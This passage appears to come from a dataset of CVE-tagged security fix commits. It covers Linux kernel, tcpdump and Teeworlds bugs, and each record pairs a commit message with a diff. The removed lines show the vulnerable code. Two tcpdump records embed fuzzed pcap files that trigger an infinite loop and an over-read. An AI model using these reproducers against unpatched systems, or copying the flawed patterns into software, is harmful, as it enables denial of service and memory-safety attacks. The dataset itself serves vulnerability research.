key ref-counting sites.\n\nSigned-off-by: Darren Hart <dvhart@linux.intel.com>\nReported-and-tested-by: Matthieu Fertré<matthieu.fertre@kerlabs.com>\nReported-by: Louis Rilling<louis.rilling@kerlabs.com>\nCc: Peter Zijlstra <peterz@infradead.org>\nCc: Eric Dumazet <eric.dumazet@gmail.com>\nCc: John Kacur <jkacur@redhat.com>\nCc: Rusty Russell <rusty@rustcorp.com.au>\nLKML-Reference: <4CBB17A8.70401@linux.intel.com>\nSigned-off-by: Thomas Gleixner <tglx@linutronix.de>\nCc: stable@kernel.org\n---\n kernel/futex.c | 31 ++++++++++++++++---------------\n 1 file changed, 16 insertions(+), 15 deletions(-)\n\n", "diff_code": "diff --git a/kernel/futex.c b/kernel/futex.c\nindex 6a3a5fa1526d8..e328f574c97c0 100644\n--- a/kernel/futex.c\n+++ b/kernel/futex.c\n@@ -1363,7 +1363,6 @@ static inline struct futex_hash_bucket *queue_lock(struct futex_q *q)\n {\n \tstruct futex_hash_bucket *hb;\n \n-\tget_futex_key_refs(&q->key);\n \thb = hash_futex(&q->key);\n \tq->lock_ptr = &hb->lock;\n \n@@ -1375,7 +1374,6 @@ static inline void\n queue_unlock(struct futex_q *q, struct futex_hash_bucket *hb)\n {\n \tspin_unlock(&hb->lock);\n-\tdrop_futex_key_refs(&q->key);\n }\n \n /**\n@@ -1480,8 +1478,6 @@ static void unqueue_me_pi(struct futex_q *q)\n \tq->pi_state = NULL;\n \n \tspin_unlock(q->lock_ptr);\n-\n-\tdrop_futex_key_refs(&q->key);\n }\n \n /*\n@@ -1812,7 +1808,10 @@ static int futex_wait(u32 __user *uaddr, int fshared,\n \t}\n \n retry:\n-\t/* Prepare to wait on uaddr. */\n+\t/*\n+\t * Prepare to wait on uaddr. On success, holds hb lock and increments\n+\t * q.key refs.\n+\t */\n \tret = futex_wait_setup(uaddr, val, fshared, &q, &hb);\n \tif (ret)\n \t\tgoto out;\n@@ -1822,24 +1821,23 @@ static int futex_wait(u32 __user *uaddr, int fshared,\n \n \t/* If we were woken (and unqueued), we succeeded, whatever. */\n \tret = 0;\n+\t/* unqueue_me() drops q.key ref */\n \tif (!unqueue_me(&q))\n-\t\tgoto out_put_key;\n+\t\tgoto out;\n \tret = -ETIMEDOUT;\n \tif (to && !to->task)\n-\t\tgoto out_put_key;\n+\t\tgoto out;\n \n \t/*\n \t * We expect signal_pending(current), but we might be the\n \t * victim of a spurious wakeup as well.\n \t */\n-\tif (!signal_pending(current)) {\n-\t\tput_futex_key(fshared, &q.key);\n+\tif (!signal_pending(current))\n \t\tgoto retry;\n-\t}\n \n \tret = -ERESTARTSYS;\n \tif (!abs_time)\n-\t\tgoto out_put_key;\n+\t\tgoto out;\n \n \trestart = &current_thread_info()->restart_block;\n \trestart->fn = futex_wait_restart;\n@@ -1856,8 +1854,6 @@ static int futex_wait(u32 __user *uaddr, int fshared,\n \n \tret = -ERESTART_RESTARTBLOCK;\n \n-out_put_key:\n-\tput_futex_key(fshared, &q.key);\n out:\n \tif (to) {\n \t\thrtimer_cancel(&to->timer);\n@@ -2236,7 +2232,10 @@ static int futex_wait_requeue_pi(u32 __user *uaddr, int fshared,\n \tq.rt_waiter = &rt_waiter;\n \tq.requeue_pi_key = &key2;\n \n-\t/* Prepare to wait on uaddr. */\n+\t/*\n+\t * Prepare to wait on uaddr. On success, increments q.key (key1) ref\n+\t * count.\n+\t */\n \tret = futex_wait_setup(uaddr, val, fshared, &q, &hb);\n \tif (ret)\n \t\tgoto out_key2;\n@@ -2254,7 +2253,9 @@ static int futex_wait_requeue_pi(u32 __user *uaddr, int fshared,\n \t * In order for us to be here, we know our q.key == key2, and since\n \t * we took the hb->lock above, we also know that futex_requeue() has\n \t * completed and we no longer have to concern ourselves with a wakeup\n-\t * race with the atomic proxy lock acquition by the requeue code.\n+\t * race with the atomic proxy lock acquisition by the requeue code. The\n+\t * futex_requeue dropped our key1 reference and incremented our key2\n+\t * reference count.\n \t */\n \n \t/* Check if the requeue code acquired the second futex for us. */\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2017-12989", "CWE_ID": "399", "category": "security", "commit_id": "db24063b01cba8e9d4d88b7d8ac70c9000c104e4", "commit_message": "From db24063b01cba8e9d4d88b7d8ac70c9000c104e4 Mon Sep 17 00:00:00 2001\nFrom: Guy Harris <guy@alum.mit.edu>\nDate: Tue, 7 Feb 2017 00:13:33 -0800\nSubject: [PATCH] CVE-2017-12989/RESP: Make sure resp_get_length() advances the\n pointer for invalid lengths.\nMIME-Version: 1.0\nContent-Type: text/plain; charset=UTF-8\nContent-Transfer-Encoding: 8bit\n\nMake sure that it always sends *endp before returning and that, for\ninvalid lengths where we don't like a character in the length string,\nwhat it sets *endp to is past the character in question, so we don't\nrun the risk of infinitely looping (or doing something else random) if a\ncharacter in the length is invalid.\n\nThis fixes an infinite loop discovered by Forcepoint's security\nresearchers Otto Airamo & Antti Levomäki.\n\nAdd a test using the capture file supplied by the reporter(s).\n---\n print-resp.c                   |  14 +++++++++++---\n tests/TESTLIST                 |   1 +\n tests/resp_4_infiniteloop.out  |   2 ++\n tests/resp_4_infiniteloop.pcap | Bin 0 -> 1036 bytes\n 4 files changed, 14 insertions(+), 3 deletions(-)\n create mode 100644 tests/resp_4_infiniteloop.out\n create mode 100644 tests/resp_4_infiniteloop.pcap\n\n", "diff_code": "diff --git a/print-resp.c b/print-resp.c\nindex 9d71e21dc..dee22d63a 100644\n--- a/print-resp.c\n+++ b/print-resp.c\n@@ -481,8 +481,10 @@ resp_get_length(netdissect_options *ndo, register const u_char *bp, int len, con\n         ND_TCHECK(*bp);\n         c = *bp;\n         if (!(c >= '0' && c <= '9')) {\n-            if (!saw_digit)\n+            if (!saw_digit) {\n+                bp++;\n                 goto invalid;\n+            }\n             break;\n         }\n         c -= '0';\n@@ -510,15 +512,19 @@ resp_get_length(netdissect_options *ndo, register const u_char *bp, int len, con\n     if (len == 0)\n         goto trunc;\n     ND_TCHECK(*bp);\n-    if (*bp != '\\r')\n+    if (*bp != '\\r') {\n+        bp++;\n         goto invalid;\n+    }\n     bp++;\n     len--;\n     if (len == 0)\n         goto trunc;\n     ND_TCHECK(*bp);\n-    if (*bp != '\\n')\n+    if (*bp != '\\n') {\n+        bp++;\n         goto invalid;\n+    }\n     bp++;\n     len--;\n     *endp = bp;\n@@ -531,8 +537,10 @@ resp_get_length(netdissect_options *ndo, register const u_char *bp, int len, con\n     return (too_large ? -3 : result);\n \n trunc:\n+    *endp = bp;\n     return (-2);\n \n invalid:\n+    *endp = bp;\n     return (-5);\n }\ndiff --git a/tests/TESTLIST b/tests/TESTLIST\nindex e0f0bb146..ecf54f69b 100644\n--- a/tests/TESTLIST\n+++ b/tests/TESTLIST\n@@ -468,6 +468,7 @@ zephyr-oobr\t\tzephyr-oobr.pcap\t\tzephyr-oobr.out\t\t-vvv -e\n bgp-as-path-oobr\tbgp-as-path-oobr.pcap\t\tbgp-as-path-oobr.out\t-vvv -e\n isakmp-no-none-np\tisakmp-no-none-np.pcap\t\tisakmp-no-none-np.out\t-vvv -e\n telnet-iac-check-oobr\ttelnet-iac-check-oobr.pcap\ttelnet-iac-check-oobr.out\t-vvv -e\n+resp_4_infiniteloop\tresp_4_infiniteloop.pcap\tresp_4_infiniteloop.out\t-vvv -e\n \n # RTP tests\n # fuzzed pcap\ndiff --git a/tests/resp_4_infiniteloop.out b/tests/resp_4_infiniteloop.out\nnew file mode 100644\nindex 000000000..396cb8b39\n--- /dev/null\n+++ b/tests/resp_4_infiniteloop.out\n@@ -0,0 +1,2 @@\n+00:50:56:b4:08:69 > 00:50:56:b4:4c:2a, ethertype IPv4 (0x0800), length 920: (tos 0x0, ttl 64, id 27576, offset 0, flags [DF], proto TCP (6), length 906)\n+    172.16.8.77.33926 > 172.16.8.149.6379: Flags [P.], cksum 0xa129 (incorrect -> 0xaaa0), seq 3839414413:3839415267, ack 2526552240, win 229, options [nop,nop,TS val 2407226 ecr 24894817], length 854: RESP length negative and not -1 invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid \"4\" \"EVAL\" invalid invalid invalid invalid \"GKMbNZq^@0\" \"stuubt.pack('<ivdMFG4294967245',^V ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''319', 2',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',', '-1494241318543828858')'L')N))'r')')~D')')E)')')')')')')')'l')')')')')'M-`'o')')'Pp)U)\" invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid invalid \"1\" [|RESP]\ndiff --git a/tests/resp_4_infiniteloop.pcap b/tests/resp_4_infiniteloop.pcap\nnew file mode 100644\nindex 0000000000000000000000000000000000000000..98a79bfb67d0098a747f02c3a945dcf401a98df9\nGIT binary patch\nliteral 1036\nzcmd<$<>fMAU|{gI(UxKa(*L1=g@KpBH6^noIk7;&NY6me2q*^vAhjTM3Q+q0e+C9l\nzpa>g~4+0863}WwK1`<eM29OWJ3;|(Ve6&C$M<xe@D+6;^_6`RI2ezcmYXmrafp}_5\nzo5brUH!k!}o1w6wL4x7wLQSBJj2v7HD!Z*1tM4Xi>6#iFnV1?F7@AvHnwnY~SQ?q}\nza;c1PV8YAg8s_MO2ncs?-z2}NLIwj~uHur?(xei-g2d!(4RxE$vJ_u8cM~H^6H7C5\nzU_h$th$*NKFfcZ>RM$~3Qr8*TP(fYS(8SWj$i&dt(8AQj*uu!d!qh@tQ{6{h(@#@V\npy$HzEtaAa8u0V_ebC7rs)bqi-fC9}>O+=Ewl|>ABxeP%06#yXcv(o?o\n\nliteral 0\nHcmV?d00001\n\n", "owner": "the-tcpdump-group", "repo": "tcpdump", "source": "cve"}
{"CVE_ID": "CVE-2016-9400", "CWE_ID": "119", "category": "security", "commit_id": "ff254722a2683867fcb3e67569ffd36226c4bc62", "commit_message": "From ff254722a2683867fcb3e67569ffd36226c4bc62 Mon Sep 17 00:00:00 2001\nFrom: oy <Tom_Adams@web.de>\nDate: Fri, 4 Nov 2016 18:43:31 +0100\nSubject: [PATCH] added some checks to snap handling\n\n---\n src/engine/client/client.cpp | 2 +-\n src/engine/shared/snapshot.h | 3 ++-\n 2 files changed, 3 insertions(+), 2 deletions(-)\n\n", "diff_code": "diff --git a/src/engine/client/client.cpp b/src/engine/client/client.cpp\nindex c5e1475941..fe4b27b783 100644\n--- a/src/engine/client/client.cpp\n+++ b/src/engine/client/client.cpp\n@@ -1239,7 +1239,7 @@ void CClient::ProcessServerPacket(CNetChunk *pPacket)\n \n \t\t\tpData = (const char *)Unpacker.GetRaw(PartSize);\n \n-\t\t\tif(Unpacker.Error())\n+\t\t\tif(Unpacker.Error() || NumParts < 1 || NumParts > CSnapshot::MAX_PARTS || Part < 0 | Part >= NumParts || PartSize < 0 || PartSize > MAX_SNAPSHOT_PACKSIZE)\n \t\t\t\treturn;\n \n \t\t\tif(GameTick >= m_CurrentRecvTick)\ndiff --git a/src/engine/shared/snapshot.h b/src/engine/shared/snapshot.h\nindex 07d1be6098..7438e2fa2b 100644\n--- a/src/engine/shared/snapshot.h\n+++ b/src/engine/shared/snapshot.h\n@@ -31,7 +31,8 @@ class CSnapshot\n public:\n \tenum\n \t{\n-\t\tMAX_SIZE=64*1024\n+\t\tMAX_PARTS\t= 64,\n+\t\tMAX_SIZE\t= MAX_PARTS*1024\n \t};\n \n \tvoid Clear() { m_DataSize = 0; m_NumItems = 0; }\n", "owner": "teeworlds", "repo": "teeworlds", "source": "cve"}
{"CVE_ID": "CVE-2013-2146", "CWE_ID": "20", "category": "security", "commit_id": "f1923820c447e986a9da0fc6bf60c1dccdf0408e", "commit_message": "From f1923820c447e986a9da0fc6bf60c1dccdf0408e Mon Sep 17 00:00:00 2001\nFrom: Stephane Eranian <eranian@google.com>\nDate: Tue, 16 Apr 2013 13:51:43 +0200\nSubject: [PATCH] perf/x86: Fix offcore_rsp valid mask for SNB/IVB\n\nThe valid mask for both offcore_response_0 and\noffcore_response_1 was wrong for SNB/SNB-EP,\nIVB/IVB-EP. It was possible to write to\nreserved bit and cause a GP fault crashing\nthe kernel.\n\nThis patch fixes the problem by correctly marking the\nreserved bits in the valid mask for all the processors\nmentioned above.\n\nA distinction between desktop and server parts is introduced\nbecause bits 24-30 are only available on the server parts.\n\nThis version of the  patch is just a rebase to perf/urgent tree\nand should apply to older kernels as well.\n\nSigned-off-by: Stephane Eranian <eranian@google.com>\nCc: peterz@infradead.org\nCc: jolsa@redhat.com\nCc: gregkh@linuxfoundation.org\nCc: security@kernel.org\nCc: ak@linux.intel.com\nSigned-off-by: Ingo Molnar <mingo@kernel.org>\n---\n arch/x86/kernel/cpu/perf_event_intel.c | 20 ++++++++++++++++----\n 1 file changed, 16 insertions(+), 4 deletions(-)\n\n", "diff_code": "diff --git a/arch/x86/kernel/cpu/perf_event_intel.c b/arch/x86/kernel/cpu/perf_event_intel.c\nindex dab7580c47aee..cc45deb791b01 100644\n--- a/arch/x86/kernel/cpu/perf_event_intel.c\n+++ b/arch/x86/kernel/cpu/perf_event_intel.c\n@@ -153,8 +153,14 @@ static struct event_constraint intel_gen_event_constraints[] __read_mostly =\n };\n \n static struct extra_reg intel_snb_extra_regs[] __read_mostly = {\n-\tINTEL_EVENT_EXTRA_REG(0xb7, MSR_OFFCORE_RSP_0, 0x3fffffffffull, RSP_0),\n-\tINTEL_EVENT_EXTRA_REG(0xbb, MSR_OFFCORE_RSP_1, 0x3fffffffffull, RSP_1),\n+\tINTEL_EVENT_EXTRA_REG(0xb7, MSR_OFFCORE_RSP_0, 0x3f807f8fffull, RSP_0),\n+\tINTEL_EVENT_EXTRA_REG(0xbb, MSR_OFFCORE_RSP_1, 0x3f807f8fffull, RSP_1),\n+\tEVENT_EXTRA_END\n+};\n+\n+static struct extra_reg intel_snbep_extra_regs[] __read_mostly = {\n+\tINTEL_EVENT_EXTRA_REG(0xb7, MSR_OFFCORE_RSP_0, 0x3fffff8fffull, RSP_0),\n+\tINTEL_EVENT_EXTRA_REG(0xbb, MSR_OFFCORE_RSP_1, 0x3fffff8fffull, RSP_1),\n \tEVENT_EXTRA_END\n };\n \n@@ -2097,7 +2103,10 @@ __init int intel_pmu_init(void)\n \t\tx86_pmu.event_constraints = intel_snb_event_constraints;\n \t\tx86_pmu.pebs_constraints = intel_snb_pebs_event_constraints;\n \t\tx86_pmu.pebs_aliases = intel_pebs_aliases_snb;\n-\t\tx86_pmu.extra_regs = intel_snb_extra_regs;\n+\t\tif (boot_cpu_data.x86_model == 45)\n+\t\t\tx86_pmu.extra_regs = intel_snbep_extra_regs;\n+\t\telse\n+\t\t\tx86_pmu.extra_regs = intel_snb_extra_regs;\n \t\t/* all extra regs are per-cpu when HT is on */\n \t\tx86_pmu.er_flags |= ERF_HAS_RSP_1;\n \t\tx86_pmu.er_flags |= ERF_NO_HT_SHARING;\n@@ -2123,7 +2132,10 @@ __init int intel_pmu_init(void)\n \t\tx86_pmu.event_constraints = intel_ivb_event_constraints;\n \t\tx86_pmu.pebs_constraints = intel_ivb_pebs_event_constraints;\n \t\tx86_pmu.pebs_aliases = intel_pebs_aliases_snb;\n-\t\tx86_pmu.extra_regs = intel_snb_extra_regs;\n+\t\tif (boot_cpu_data.x86_model == 62)\n+\t\t\tx86_pmu.extra_regs = intel_snbep_extra_regs;\n+\t\telse\n+\t\t\tx86_pmu.extra_regs = intel_snb_extra_regs;\n \t\t/* all extra regs are per-cpu when HT is on */\n \t\tx86_pmu.er_flags |= ERF_HAS_RSP_1;\n \t\tx86_pmu.er_flags |= ERF_NO_HT_SHARING;\n", "owner": "mjg59", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2017-13000", "CWE_ID": "119", "category": "security", "commit_id": "8512734883227c11568bb35da1d48b9f8466f43f", "commit_message": "From 8512734883227c11568bb35da1d48b9f8466f43f Mon Sep 17 00:00:00 2001\nFrom: Guy Harris <guy@alum.mit.edu>\nDate: Tue, 21 Feb 2017 14:10:15 -0800\nSubject: [PATCH] CVE-2017-13000/IEEE 802.15.4: Fix bug introduced two fixes\n prior.\nMIME-Version: 1.0\nContent-Type: text/plain; charset=UTF-8\nContent-Transfer-Encoding: 8bit\n\nWe've already advanced the pointer past the PAN ID, if present; it now\npoints to the address, so don't add 2 to it.\n\nThis fixes a buffer over-read discovered by Forcepoint's security\nresearchers Otto Airamo & Antti Levomäki.\n\nAdd a test using the capture file supplied by the reporter(s).\n---\n print-802_15_4.c           |   2 +-\n tests/802_15_4_beacon.out  |   1 +\n tests/802_15_4_beacon.pcap | Bin 0 -> 79 bytes\n tests/TESTLIST             |   1 +\n 4 files changed, 3 insertions(+), 1 deletion(-)\n create mode 100644 tests/802_15_4_beacon.out\n create mode 100644 tests/802_15_4_beacon.pcap\n\n", "diff_code": "diff --git a/print-802_15_4.c b/print-802_15_4.c\nindex a7817eb5a..1c77da8af 100644\n--- a/print-802_15_4.c\n+++ b/print-802_15_4.c\n@@ -122,7 +122,7 @@ ieee802_15_4_if_print(netdissect_options *ndo,\n \t\t\treturn hdrlen;\n \t\t}\n \t\tif (ndo->ndo_vflag)\n-\t\t\tND_PRINT((ndo,\"%04x:%04x \", panid, EXTRACT_LE_16BITS(p + 2)));\n+\t\t\tND_PRINT((ndo,\"%04x:%04x \", panid, EXTRACT_LE_16BITS(p)));\n \t\tp += 2;\n \t\tcaplen -= 2;\n \t\thdrlen += 2;\ndiff --git a/tests/802_15_4_beacon.out b/tests/802_15_4_beacon.out\nnew file mode 100644\nindex 000000000..125f46d5c\n--- /dev/null\n+++ b/tests/802_15_4_beacon.out\n@@ -0,0 +1 @@\n+IEEE 802.15.4 Beacon packet seq cd ffab:cdff < [|802.15.4]\ndiff --git a/tests/802_15_4_beacon.pcap b/tests/802_15_4_beacon.pcap\nnew file mode 100644\nindex 0000000000000000000000000000000000000000..9e6aafe1dbec4d718da44607bf4e7dcdc4ed6d3e\nGIT binary patch\nliteral 79\nzcmZ3u>F^Z>CI%J;1_uTO1~6a;l7}ON&E7Mx-+KXMtAlXE>$9u>|3AB$5v+vgpn|<%\nW2b&Zd6Nt+w!@zigfl->F>No)OKN3&?\n\nliteral 0\nHcmV?d00001\n\ndiff --git a/tests/TESTLIST b/tests/TESTLIST\nindex be914a4a9..548af8f30 100644\n--- a/tests/TESTLIST\n+++ b/tests/TESTLIST\n@@ -489,6 +489,7 @@ pimv2-oobr-4\t\tpimv2-oobr-4.pcap\t\tpimv2-oobr-4.out\t\t-vvv -e\n 802_15_4-oobr-1\t\t802_15_4-oobr-1.pcap\t\t802_15_4-oobr-1.out\t-vvv -e\n 802_15_4-oobr-2\t\t802_15_4-oobr-2.pcap\t\t802_15_4-oobr-2.out\t-vvv -e\n 802_15_4-data\t\t802_15_4-data.pcap\t\t802_15_4-data.out\t-vvv -e\n+802_15_4_beacon\t\t802_15_4_beacon.pcap\t\t802_15_4_beacon.out\t-vvv -e\n \n # RTP tests\n # fuzzed pcap\n", "owner": "the-tcpdump-group", "repo": "tcpdump", "source": "cve"}
{"CVE_ID": "CVE-2011-0999", "CWE_ID": "399", "category": "security", "commit_id": "a7d6e4ecdb7648478ddec76d30d87d03d6e22b31", "commit_message": "From a7d6e4ecdb7648478ddec76d30d87d03d6e22b31 Mon Sep 17 00:00:00 2001\nFrom: Andrea Arcangeli <aarcange@redhat.com>\nDate: Tue, 15 Feb 2011 19:02:45 +0100\nSubject: thp: prevent hugepages during args/env copying into the user stack\n\nTransparent hugepages can only be created if rmap is fully\nfunctional. So we must prevent hugepages to be created while\nis_vma_temporary_stack() is true.\n\nThis also optmizes away some harmless but unnecessary setting of\nkhugepaged_scan.address and it switches some BUG_ON to VM_BUG_ON.\n\nSigned-off-by: Andrea Arcangeli <aarcange@redhat.com>\nAcked-by: Rik van Riel <riel@redhat.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n include/linux/huge_mm.h |  3 ++-\n mm/huge_memory.c        | 35 ++++++++++++++++-------------------\n 2 files changed, 18 insertions(+), 20 deletions(-)\n\n", "diff_code": "diff --git a/include/linux/huge_mm.h b/include/linux/huge_mm.h\nindex 8e6c8c42bc3c..df29c8fde36b 100644\n--- a/include/linux/huge_mm.h\n+++ b/include/linux/huge_mm.h\n@@ -57,7 +57,8 @@ extern pmd_t *page_check_address_pmd(struct page *page,\n \t  (transparent_hugepage_flags &\t\t\t\t\t\\\n \t   (1<<TRANSPARENT_HUGEPAGE_REQ_MADV_FLAG) &&\t\t\t\\\n \t   ((__vma)->vm_flags & VM_HUGEPAGE))) &&\t\t\t\\\n-\t !((__vma)->vm_flags & VM_NOHUGEPAGE))\n+\t !((__vma)->vm_flags & VM_NOHUGEPAGE) &&\t\t\t\\\n+\t !is_vma_temporary_stack(__vma))\n #define transparent_hugepage_defrag(__vma)\t\t\t\t\\\n \t((transparent_hugepage_flags &\t\t\t\t\t\\\n \t  (1<<TRANSPARENT_HUGEPAGE_DEFRAG_FLAG)) ||\t\t\t\\\ndiff --git a/mm/huge_memory.c b/mm/huge_memory.c\nindex e62ddb8f24b6..3e29781ee762 100644\n--- a/mm/huge_memory.c\n+++ b/mm/huge_memory.c\n@@ -1811,6 +1811,8 @@ static void collapse_huge_page(struct mm_struct *mm,\n \t/* VM_PFNMAP vmas may have vm_ops null but vm_file set */\n \tif (!vma->anon_vma || vma->vm_ops || vma->vm_file)\n \t\tgoto out;\n+\tif (is_vma_temporary_stack(vma))\n+\t\tgoto out;\n \tVM_BUG_ON(is_linear_pfn_mapping(vma) || is_pfn_mapping(vma));\n \n \tpgd = pgd_offset(mm, address);\n@@ -2032,32 +2034,27 @@ static unsigned int khugepaged_scan_mm_slot(unsigned int pages,\n \t\tif ((!(vma->vm_flags & VM_HUGEPAGE) &&\n \t\t     !khugepaged_always()) ||\n \t\t    (vma->vm_flags & VM_NOHUGEPAGE)) {\n+\t\tskip:\n \t\t\tprogress++;\n \t\t\tcontinue;\n \t\t}\n-\n \t\t/* VM_PFNMAP vmas may have vm_ops null but vm_file set */\n-\t\tif (!vma->anon_vma || vma->vm_ops || vma->vm_file) {\n-\t\t\tkhugepaged_scan.address = vma->vm_end;\n-\t\t\tprogress++;\n-\t\t\tcontinue;\n-\t\t}\n+\t\tif (!vma->anon_vma || vma->vm_ops || vma->vm_file)\n+\t\t\tgoto skip;\n+\t\tif (is_vma_temporary_stack(vma))\n+\t\t\tgoto skip;\n+\n \t\tVM_BUG_ON(is_linear_pfn_mapping(vma) || is_pfn_mapping(vma));\n \n \t\thstart = (vma->vm_start + ~HPAGE_PMD_MASK) & HPAGE_PMD_MASK;\n \t\thend = vma->vm_end & HPAGE_PMD_MASK;\n-\t\tif (hstart >= hend) {\n-\t\t\tprogress++;\n-\t\t\tcontinue;\n-\t\t}\n+\t\tif (hstart >= hend)\n+\t\t\tgoto skip;\n+\t\tif (khugepaged_scan.address > hend)\n+\t\t\tgoto skip;\n \t\tif (khugepaged_scan.address < hstart)\n \t\t\tkhugepaged_scan.address = hstart;\n-\t\tif (khugepaged_scan.address > hend) {\n-\t\t\tkhugepaged_scan.address = hend + HPAGE_PMD_SIZE;\n-\t\t\tprogress++;\n-\t\t\tcontinue;\n-\t\t}\n-\t\tBUG_ON(khugepaged_scan.address & ~HPAGE_PMD_MASK);\n+\t\tVM_BUG_ON(khugepaged_scan.address & ~HPAGE_PMD_MASK);\n \n \t\twhile (khugepaged_scan.address < hend) {\n \t\t\tint ret;\n@@ -2086,7 +2083,7 @@ breakouterloop:\n breakouterloop_mmap_sem:\n \n \tspin_lock(&khugepaged_mm_lock);\n-\tBUG_ON(khugepaged_scan.mm_slot != mm_slot);\n+\tVM_BUG_ON(khugepaged_scan.mm_slot != mm_slot);\n \t/*\n \t * Release the current mm_slot if this mm is about to die, or\n \t * if we scanned all vmas of this mm.\n@@ -2241,9 +2238,9 @@ static int khugepaged(void *none)\n \n \tfor (;;) {\n \t\tmutex_unlock(&khugepaged_mutex);\n-\t\tBUG_ON(khugepaged_thread != current);\n+\t\tVM_BUG_ON(khugepaged_thread != current);\n \t\tkhugepaged_loop();\n-\t\tBUG_ON(khugepaged_thread != current);\n+\t\tVM_BUG_ON(khugepaged_thread != current);\n \n \t\tmutex_lock(&khugepaged_mutex);\n \t\tif (!khugepaged_enabled())\n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "stoth68000", "repo": "media-tree", "source": "cve"}
{"CVE_ID": "CVE-2015-8660", "CWE_ID": "264", "category": "security", "commit_id": "acff81ec2c79492b180fade3c2894425cd35a545", "commit_message": "From acff81ec2c79492b180fade3c2894425cd35a545 Mon Sep 17 00:00:00 2001\nFrom: Miklos Szeredi <miklos@szeredi.hu>\nDate: Fri, 4 Dec 2015 19:18:48 +0100\nSubject: ovl: fix permission checking for setattr\n\n[Al Viro] The bug is in being too enthusiastic about optimizing ->setattr()\naway - instead of \"copy verbatim with metadata\" + \"chmod/chown/utimes\"\n(with the former being always safe and the latter failing in case of\ninsufficient permissions) it tries to combine these two.  Note that copyup\nitself will have to do ->setattr() anyway; _that_ is where the elevated\ncapabilities are right.  Having these two ->setattr() (one to set verbatim\ncopy of metadata, another to do what overlayfs ->setattr() had been asked\nto do in the first place) combined is where it breaks.\n\nSigned-off-by: Miklos Szeredi <miklos@szeredi.hu>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>\n---\n fs/overlayfs/inode.c | 8 ++++----\n 1 file changed, 4 insertions(+), 4 deletions(-)\n\n", "diff_code": "diff --git a/fs/overlayfs/inode.c b/fs/overlayfs/inode.c\nindex ec0c2a050043..961284936917 100644\n--- a/fs/overlayfs/inode.c\n+++ b/fs/overlayfs/inode.c\n@@ -49,13 +49,13 @@ int ovl_setattr(struct dentry *dentry, struct iattr *attr)\n \tif (err)\n \t\tgoto out;\n \n-\tupperdentry = ovl_dentry_upper(dentry);\n-\tif (upperdentry) {\n+\terr = ovl_copy_up(dentry);\n+\tif (!err) {\n+\t\tupperdentry = ovl_dentry_upper(dentry);\n+\n \t\tmutex_lock(&upperdentry->d_inode->i_mutex);\n \t\terr = notify_change(upperdentry, attr, NULL);\n \t\tmutex_unlock(&upperdentry->d_inode->i_mutex);\n-\t} else {\n-\t\terr = ovl_copy_up_last(dentry, attr, false);\n \t}\n \tovl_drop_write(dentry);\n out:\n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2014-3182", "CWE_ID": "119", "category": "security", "commit_id": "ad3e14d7c5268c2e24477c6ef54bbdf88add5d36", "commit_message": "From ad3e14d7c5268c2e24477c6ef54bbdf88add5d36 Mon Sep 17 00:00:00 2001\nFrom: Jiri Kosina <jkosina@suse.cz>\nDate: Thu, 21 Aug 2014 09:57:17 -0500\nSubject: HID: logitech: perform bounds checking on device_id early enough\n\ndevice_index is a char type and the size of paired_dj_deivces is 7\nelements, therefore proper bounds checking has to be applied to\ndevice_index before it is used.\n\nWe are currently performing the bounds checking in\nlogi_dj_recv_add_djhid_device(), which is too late, as malicious device\ncould send REPORT_TYPE_NOTIF_DEVICE_UNPAIRED early enough and trigger the\nproblem in one of the report forwarding functions called from\nlogi_dj_raw_event().\n\nFix this by performing the check at the earliest possible ocasion in\nlogi_dj_raw_event().\n\nCc: stable@vger.kernel.org\nReported-by: Ben Hawkes <hawkes@google.com>\nReviewed-by: Benjamin Tissoires <benjamin.tissoires@redhat.com>\nSigned-off-by: Jiri Kosina <jkosina@suse.cz>\n---\n drivers/hid/hid-logitech-dj.c | 13 ++++++-------\n 1 file changed, 6 insertions(+), 7 deletions(-)\n\n", "diff_code": "diff --git a/drivers/hid/hid-logitech-dj.c b/drivers/hid/hid-logitech-dj.c\nindex ca0ab5112efd..b7ba82960c79 100644\n--- a/drivers/hid/hid-logitech-dj.c\n+++ b/drivers/hid/hid-logitech-dj.c\n@@ -238,13 +238,6 @@ static void logi_dj_recv_add_djhid_device(struct dj_receiver_dev *djrcv_dev,\n \t\treturn;\n \t}\n \n-\tif ((dj_report->device_index < DJ_DEVICE_INDEX_MIN) ||\n-\t    (dj_report->device_index > DJ_DEVICE_INDEX_MAX)) {\n-\t\tdev_err(&djrcv_hdev->dev, \"%s: invalid device index:%d\\n\",\n-\t\t\t__func__, dj_report->device_index);\n-\t\treturn;\n-\t}\n-\n \tif (djrcv_dev->paired_dj_devices[dj_report->device_index]) {\n \t\t/* The device is already known. No need to reallocate it. */\n \t\tdbg_hid(\"%s: device is already known\\n\", __func__);\n@@ -690,6 +683,12 @@ static int logi_dj_raw_event(struct hid_device *hdev,\n \t * device (via hid_input_report() ) and return 1 so hid-core does not do\n \t * anything else with it.\n \t */\n+\tif ((dj_report->device_index < DJ_DEVICE_INDEX_MIN) 